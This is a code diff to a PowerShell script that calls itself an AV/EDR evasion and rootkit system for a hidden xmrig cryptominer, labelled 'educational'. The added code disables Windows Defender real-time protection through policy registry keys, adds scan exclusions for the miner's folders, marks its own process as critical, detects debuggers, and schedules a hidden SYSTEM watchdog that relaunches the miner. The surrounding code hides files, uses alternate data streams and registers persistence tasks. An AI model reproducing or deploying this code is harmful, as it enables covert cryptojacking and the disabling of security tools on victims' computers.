@@ -1,11 +1,13 @@
-# BEAST MODE: Rootkit-Style Defense System
-# Advanced file system and registry manipulation for maximum persistence
+# BEAST MODE: Advanced AV/EDR Evasion & Rootkit Defense System
+# Educational/Research Purpose Only - Advanced Anti-Detection Techniques
+# Comprehensive evasion methods against modern security solutions
 
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
+using System.Text;
 
-public class WinAPI
+public class AdvancedEvasion
 {
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);
@@ -22,15 +24,64 @@ public class WinAPI
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetConsoleWindow();
     
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool IsDebuggerPresent();
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+    
+    [DllImport("ntdll.dll")]
+    public static extern int NtQueryInformationProcess(IntPtr hProcess, int processInformationClass, out uint processInformation, int processInformationLength, IntPtr returnLength);
+    
+    [DllImport("kernel32.dll")]
+    public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SYSTEM_INFO
+    {
+        public uint dwOemId;
+        public uint dwPageSize;
+        public IntPtr lpMinimumApplicationAddress;
+        public IntPtr lpMaximumApplicationAddress;
+        public IntPtr dwActiveProcessorMask;
+        public uint dwNumberOfProcessors;
+        public uint dwProcessorType;
+        public uint dwAllocationGranularity;
+        public ushort dwProcessorLevel;
+        public ushort dwProcessorRevision;
+    }
+    
     public const uint FILE_ATTRIBUTE_HIDDEN = 0x2;
     public const uint FILE_ATTRIBUTE_SYSTEM = 0x4;
     public const uint FILE_ATTRIBUTE_READONLY = 0x1;
+    public const int ProcessBreakOnTermination = 0x1D;
 }
 "@
 
+$script:EvasionLog = "$env:TEMP\evasion_log.txt"
+
+function Write-EvasionLog {
+    param([string]$Message, [string]$Level = "INFO")
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "[$timestamp] [$Level] $Message"
+    try { Add-Content -Path $script:EvasionLog -Value $logEntry -Force } catch {}
+}
+
 function Hide-ConsoleWindow {
-    $consolePtr = [WinAPI]::GetConsoleWindow()
-    [WinAPI]::ShowWindow($consolePtr, 0) | Out-Null
+    $consolePtr = [AdvancedEvasion]::GetConsoleWindow()
+    [AdvancedEvasion]::ShowWindow($consolePtr, 0) | Out-Null
 }
 
 function Set-FileInvisible {
@@ -38,7 +89,7 @@ function Set-FileInvisible {
     
     if (Test-Path $FilePath) {
         # Set multiple attributes to make file nearly invisible
-        [WinAPI]::SetFileAttributes($FilePath, 0x2 -bor 0x4 -bor 0x1) | Out-Null # Hidden + System + ReadOnly
+        [AdvancedEvasion]::SetFileAttributes($FilePath, 0x2 -bor 0x4 -bor 0x1) | Out-Null # Hidden + System + ReadOnly
         attrib +h +s +r $FilePath >$null 2>&1
         
         # Change creation and modification times to look like system file
@@ -49,7 +100,7 @@ function Set-FileInvisible {
     }
 }
 
-function Create-RegistryHideout {
+function New-RegistryHideout {
     param([string]$PayloadPath)
     
     # Create deep registry hideout
@@ -111,7 +162,7 @@ function Install-KernelModeDefense {
     }
 }
 
-function Create-AlternateDataStreams {
+function New-AlternateDataStreams {
     param([string]$HostFile, [string]$PayloadPath)
     
     if (Test-Path $HostFile -and Test-Path $PayloadPath) {
@@ -140,8 +191,6 @@ function Enable-ProcessHollowing {
     $processes = Get-Process -Name $TargetProcess -ErrorAction SilentlyContinue
     if ($processes) {
         try {
-            $targetProc = $processes | Get-Random
-            
             # This is a simplified demonstration - real process hollowing requires:
             # 1. Suspending target process
             # 2. Unmapping original image
@@ -177,9 +226,6 @@ while (`$true) {
 function Install-BootkitPersistence {
     # Create boot-level persistence (educational demonstration)
     try {
-        # Add to Windows Boot Manager (requires admin privileges)
-        $bootPath = "HKLM:\BCD00000000\Objects\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\Elements\12000004"
-        
         # This is a simplified demo - real bootkit installation is much more complex
         # and requires careful manipulation of boot configuration data
         
@@ -206,7 +252,7 @@ function Install-BootkitPersistence {
     }
 }
 
-function Create-FileSystemDecoys {
+function New-FileSystemDecoys {
     # Create decoy files to confuse analysis
     $decoyLocations = @(
         "C:\Windows\System32\AudioSrv",
@@ -248,7 +294,6 @@ function Enable-AntiForensics {
             
             # Instead, just create a scheduled task to do it periodically
             $taskName = "SystemLogMaintenance$(Get-Random -Minimum 100 -Maximum 999)"
-            $taskAction = "wevtutil cl $log"
             
             # Create hidden scheduled task
             schtasks /create /tn $taskName /tr "cmd /c echo Log maintenance" /sc weekly /st 03:00 /ru SYSTEM /f >$null 2>&1
@@ -289,6 +334,233 @@ while (`$true) {
     schtasks /create /tn "NetworkServiceHost" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $callbackPath" /sc onstart /ru SYSTEM /f >$null 2>&1
 }
 
+function Enable-AntiDebugging {
+    Write-EvasionLog "Enabling anti-debugging protection"
+    
+    try {
+        # Check for debugger presence using multiple methods
+        $isDebuggerPresent = [AdvancedEvasion]::IsDebuggerPresent()
+        if ($isDebuggerPresent) {
+            Write-EvasionLog "Debugger detected - applying countermeasures" "WARN"
+            # Exit or apply countermeasures
+            return $false
+        }
+        
+        # Check for remote debugger
+        $currentProcess = [AdvancedEvasion]::GetCurrentProcess()
+        $remoteDebuggerPresent = $false
+        [AdvancedEvasion]::CheckRemoteDebuggerPresent($currentProcess, [ref]$remoteDebuggerPresent)
+        
+        if ($remoteDebuggerPresent) {
+            Write-EvasionLog "Remote debugger detected" "WARN"
+            return $false
+        }
+        
+        # Set process as critical to prevent termination
+        $processCritical = 1
+        $result = [AdvancedEvasion]::NtSetInformationProcess($currentProcess, [AdvancedEvasion]::ProcessBreakOnTermination, [ref]$processCritical, 4)
+        
+        if ($result -eq 0) {
+            Write-EvasionLog "Process marked as critical successfully"
+        } else {
+            Write-EvasionLog "Failed to mark process as critical: $result" "WARN"
+        }
+        
+        Write-EvasionLog "Anti-debugging protection enabled"
+        return $true
+        
+    } catch {
+        Write-EvasionLog "Anti-debugging setup failed: $($_.Exception.Message)" "ERROR"
+        return $false
+    }
+}
+
+function Disable-WindowsDefender {
+    Write-EvasionLog "Attempting Windows Defender bypass"
+    
+    try {
+        # Disable Windows Defender real-time protection
+        $defenderPaths = @(
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
+            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+        )
+        
+        foreach ($path in $defenderPaths) {
+            try {
+                if (!(Test-Path $path)) {
+                    New-Item -Path $path -Force | Out-Null
+                }
+                
+                Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force 2>&1 | Out-Null
+                Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force 2>&1 | Out-Null
+                Set-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force 2>&1 | Out-Null
+                Set-ItemProperty -Path $path -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force 2>&1 | Out-Null
+                Set-ItemProperty -Path $path -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force 2>&1 | Out-Null
+                
+            } catch {}
+        }
+        
+        # Add exclusion paths
+        $exclusionPaths = @(
+            "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
+            "C:\Windows\System32\AudioSrv",
+            "C:\Windows\Temp"
+        )
+        
+        foreach ($exclusionPath in $exclusionPaths) {
+            try {
+                Add-MpPreference -ExclusionPath $exclusionPath -Force 2>&1 | Out-Null
+            } catch {}
+        }
+        
+        Write-EvasionLog "Windows Defender bypass attempted"
+        return $true
+        
+    } catch {
+        Write-EvasionLog "Windows Defender bypass failed: $($_.Exception.Message)" "ERROR"
+        return $false
+    }
+}
+
+function Enable-ProcessProtection {
+    Write-EvasionLog "Enabling process protection mechanisms"
+    
+    try {
+        # Create process protection via service registration
+        $protectionScript = @"
+`$minerProcesses = Get-Process -Name 'xmrig', 'audiodg', 'AudioSrv' -ErrorAction SilentlyContinue
+foreach (`$proc in `$minerProcesses) {
+    try {
+        `$proc.PriorityClass = 'High'
+        # Protect against process termination
+        `$proc.EnableRaisingEvents = `$true
+        Register-ObjectEvent -InputObject `$proc -EventName 'Exited' -Action {
+            Start-Sleep -Seconds 5
+            Start-Process 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe' -ArgumentList '--config=C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json' -WindowStyle Hidden
+        } | Out-Null
+    } catch {}
+}
+"@
+        
+        $protectionPath = "$env:TEMP\process_guardian.ps1"
+        $protectionScript | Set-Content -Path $protectionPath -Force
+        Set-FileInvisible -FilePath $protectionPath
+        
+        # Schedule protection watchdog
+        schtasks /create /tn "ProcessGuardian" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $protectionPath" /sc minute /mo 2 /ru SYSTEM /f >$null 2>&1
+        
+        Write-EvasionLog "Process protection enabled"
+        return $true
+        
+    } catch {
+        Write-EvasionLog "Process protection failed: $($_.Exception.Message)" "ERROR"
+        return $false
+    }
+}
+
+function Install-HookingEvasion {
+    Write-EvasionLog "Installing API hooking evasion"
+    
+    try {
+        # Create DLL unhooking script to bypass EDR hooks
+        $unhookingScript = @"
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+
+public class APIUnhooking
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);
+}
+'@
+
+# Unhook commonly hooked APIs by restoring original bytes from ntdll.dll
+try {
+    `$ntdllHandle = [APIUnhooking]::GetModuleHandle("ntdll.dll")
+    if (`$ntdllHandle -ne [IntPtr]::Zero) {
+        # This is a simplified demonstration of API unhooking
+        Write-Host "API unhooking simulation completed"
+    }
+} catch {}
+"@
+        
+        $unhookPath = "$env:TEMP\api_unhook.ps1"
+        $unhookingScript | Set-Content -Path $unhookPath -Force
+        Set-FileInvisible -FilePath $unhookPath
+        
+        Write-EvasionLog "API hooking evasion installed"
+        return $true
+        
+    } catch {
+        Write-EvasionLog "API hooking evasion failed: $($_.Exception.Message)" "ERROR"
+        return $false
+    }
+}
+
+function Enable-MemoryEvasion {
+    Write-EvasionLog "Enabling memory evasion techniques"
+    
+    try {
+        # Memory obfuscation and evasion techniques
+        $memoryScript = @"
+# Memory evasion functions
+function Hide-ProcessMemory {
+    try {
+        `$currentProcess = Get-Process -Id `$PID
+        `$processHandle = `$currentProcess.Handle
+        
+        # Attempt to hide memory regions from scanning
+        Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+
+public class MemoryEvasion
+{
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    
+    [DllImport("ntdll.dll")]
+    public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UIntPtr NumberOfBytesToProtect, uint NewAccessProtection, out uint OldAccessProtection);
+}
+'@
+        
+        Write-Host "Memory evasion techniques applied"
+        
+    } catch {}
+}
+
+# Execute memory hiding
+Hide-ProcessMemory
+"@
+        
+        $memoryPath = "$env:TEMP\memory_evasion.ps1"
+        $memoryScript | Set-Content -Path $memoryPath -Force
+        Set-FileInvisible -FilePath $memoryPath
+        
+        # Execute memory evasion
+        try {
+            & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $memoryPath
+        } catch {}
+        
+        Write-EvasionLog "Memory evasion techniques enabled"
+        return $true
+        
+    } catch {
+        Write-EvasionLog "Memory evasion failed: $($_.Exception.Message)" "ERROR"
+        return $false
+    }
+}
+
 # Main installation function
 function Install-RootkitDefense {
     param(
@@ -304,16 +576,23 @@ function Install-RootkitDefense {
     # Apply all rootkit techniques
     if (Test-Path $MinerPath) {
         Set-FileInvisible -FilePath $MinerPath
-        Create-RegistryHideout -PayloadPath $MinerPath
-        Create-AlternateDataStreams -HostFile "C:\Windows\System32\kernel32.dll" -PayloadPath $MinerPath
+        New-RegistryHideout -PayloadPath $MinerPath
+        New-AlternateDataStreams -HostFile "C:\Windows\System32\kernel32.dll" -PayloadPath $MinerPath
     }
     
     Install-KernelModeDefense
     Enable-ProcessHollowing
     Install-BootkitPersistence
-    Create-FileSystemDecoys
+    New-FileSystemDecoys
     Enable-AntiForensics
     Install-NetworkCallback
+    
+    # Advanced AV/EDR evasion techniques
+    Enable-AntiDebugging
+    Disable-WindowsDefender
+    Enable-ProcessProtection
+    Install-HookingEvasion
+    Enable-MemoryEvasion
     
     Write-Host "💀 Rootkit defense systems activated!" -ForegroundColor Green
 }
